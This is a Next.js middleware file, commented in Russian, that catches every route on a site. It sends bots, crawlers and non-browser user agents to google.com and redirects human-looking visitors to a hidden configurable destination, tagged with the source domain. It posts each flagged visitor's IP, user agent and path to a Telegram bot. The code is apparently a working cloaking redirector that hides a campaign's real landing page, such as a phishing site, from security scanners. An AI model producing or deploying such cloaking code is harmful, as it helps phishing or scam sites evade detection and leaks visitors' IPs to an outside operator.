
// middleware.js
import { NextResponse } from "next/server";

//
const BOT_JSON_URL = "https://raw.githubusercontent.com/arcjet/well-known-bots/main/well-known-bots.json";
const URL_SITE = process.env.URL_SITE || "https://yahoo.com"; 
const BOT_LIST_TTL = 60 * 60 * 1000; // кешировать 1 час
const TELEGRAM_TIMEOUT_MS = 2700; // таймаут для вызова телеграма в middleware

// Вставь сюда токен/чат или используй env-переменные
const BOT_TOKEN = process.env.TG_BOT_TOKEN || ""; // например '6438....'
const CHAT_ID = process.env.TG_CHAT_ID || "";     // например '1743635369'

// кэш в глобальной области (edge runtime / serverless может переиспользовать)
if (!globalThis.__bot_cache) {
  globalThis.__bot_cache = { regexes: [], fetchedAt: 0, fetching: null };
}

async function loadBotRegexes() {
  const now = Date.now();
  const cache = globalThis.__bot_cache;

  // если в кэше и не устарело — вернуть
  if (cache.regexes.length && now - cache.fetchedAt < BOT_LIST_TTL) return cache.regexes;

  // если уже идёт fetch — дождаться его
  if (cache.fetching) {
    try { await cache.fetching } catch(e) {}
    return cache.regexes;
  }

  // запускаем fetch и сохраняем промис в cache.fetching
  cache.fetching = (async () => {
    try {
      const res = await fetch(BOT_JSON_URL, { cf: { cacheTtl: 3600 } });
      if (!res.ok) {
        console.warn("bot list fetch failed", res.status);
        cache.fetching = null;
        return cache.regexes;
      }
      const json = await res.json();

      const regexes = [];
      if (Array.isArray(json)) {
        for (const entry of json) {
          // entry может быть строкой или объектом { pattern: "..." }
          let pattern = null;
          if (typeof entry === "string") pattern = entry;
          else if (entry && typeof entry.pattern === "string") pattern = entry.pattern;
          else if (entry && typeof entry.ua === "string") pattern = entry.ua;

          if (!pattern) continue;

          // если pattern выглядит как /.../ то вырежем / и флаги (в случае)
          let rx = null;
          try {
            if (pattern.startsWith("/") && pattern.lastIndexOf("/") > 0) {
              const last = pattern.lastIndexOf("/");
              const body = pattern.slice(1, last);
              const flags = pattern.slice(last + 1);
              rx = new RegExp(body, flags.includes("i") ? flags : flags + "i");
            } else {
              // безопасно создаём RegExp (экранируем обычные строки? но часто в списках уже regex)
              // попытаемся сначала как регулярку, если упадёт — используем простую includes-проверку ниже
              try {
                rx = new RegExp(pattern, "i");
              } catch (e) {
                // если невалидная regex, превратим в экранированную строку
                rx = new RegExp(pattern.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"), "i");
              }
            }
          } catch (e) {
            continue;
          }
          if (rx) regexes.push(rx);
        }
      }
      cache.regexes = regexes;
      cache.fetchedAt = Date.now();
    } catch (e) {
      console.warn("Error loading bot patterns:", e?.message || e);
    } finally {
      cache.fetching = null;
    }
  })();

  await cache.fetching;
  return cache.regexes;
}

function getDomain(req) {
  try {
    const getHeader = (name) => {
      if (typeof req.headers?.get === "function") return req.headers.get(name);
      if (req.headers && typeof req.headers === "object") return req.headers[name];
      return undefined;
    };

    const hostHeader = getHeader("x-forwarded-host") || getHeader("host");
    if (hostHeader) {
      return new URL("http://" + hostHeader).hostname; // берём только hostname
    }

    const referer = getHeader("referer") || getHeader("referrer");
    if (referer) {
      try {
        return new URL(referer).hostname; // всегда hostname
      } catch (e) {
        console.warn("Bad referer URL:", referer);
      }
    }

    const envUrl = process.env.URL || process.env.DEPLOY_URL;
    if (envUrl) {
      try {
        return new URL(envUrl).hostname;
      } catch (e) {
        return envUrl;
      }
    }
  } catch (err) {
    console.warn("getDomain failed:", err);
  }
  return "unknown-domain";
}

async function notifyTelegram(text, req, data = {}) {
  let envUrl = "unknown-domain";

  const mainDomain = getDomain(req);
  console.log("Detected domain:", mainDomain);
  try {
    envUrl = process.env.URL || process.env.DEPLOY_URL || "unknown-domain";
    console.log("env URL:", envUrl);
  } catch (err) {
    console.warn("failed to read env vars:", err);
  }

  const token = BOT_TOKEN || process.env.TG_BOT_TOKEN;
  const chat = CHAT_ID || process.env.TG_CHAT_ID;
  if (!token || !chat) {
    console.warn("Telegram token/chat not set");
    return;
  }

  // пробуем вытащить домен
  const finalText = `🌐 main: ${mainDomain} / ${envUrl}\n${text}`;

  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), TELEGRAM_TIMEOUT_MS);

  try {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chat, text: finalText }),
      signal: controller.signal,
    });
  } catch (e) {
    console.warn("Telegram notify failed (ignored)", e?.message || e);
  } finally {
    clearTimeout(id);
  }
}



export async function middleware(req) {
  const ua = req.headers.get("user-agent") || "";
  const isHumanLike = ua.includes("Mozilla");
  const url = req.nextUrl.pathname + (req.nextUrl.search || "");
  const ip = req.headers.get("x-forwarded-for") || req.headers.get("cf-connecting-ip") || "unknown";
  let envUrl = process.env.URL || process.env.DEPLOY_URL || "unknown-domain";
  // --- достаем домен из ENV ---
  const mainDomain = getDomain(req);
  try {
    // убираем https:// или http:// если есть
    envUrl = new URL(envUrl).host;
  } catch (e) {
    console.warn("Invalid envUrl:", envUrl);
  }

  // пустой юа — сразу считаем ботом
  if (!isHumanLike) {
    notifyTelegram(`🚨 Подозрительный UA: ${ua}\nIP: ${ip}\nURL: ${url}`, req);
    return NextResponse.redirect("https://google.com");
  }

  // загружаем паттерны (из кэша или сети)
  let regexes = [];
  try {
    regexes = await loadBotRegexes();
  } catch (e) {
    console.warn("loadBotRegexes failed", e?.message || e);
  }

  const isBot = regexes.some(rx => {
    try { return rx.test(ua); } catch (e) { return false; }
  });

  if (isBot) {
    notifyTelegram(`🚨 Known bot detected\nUA: ${ua}\nIP: ${ip}\nURL: ${url}`, req);
    return NextResponse.redirect("https://google.com");
  }

  // --- добавляем параметр src=envUrl в ссылку ---
  const target = new URL(URL_SITE);
  target.searchParams.set("s3", mainDomain);

  // редиректим на обновленную ссылку
  return NextResponse.redirect(target.toString());
}

// применяем на все роуты
export const config = { matcher: ["/:path*"] };


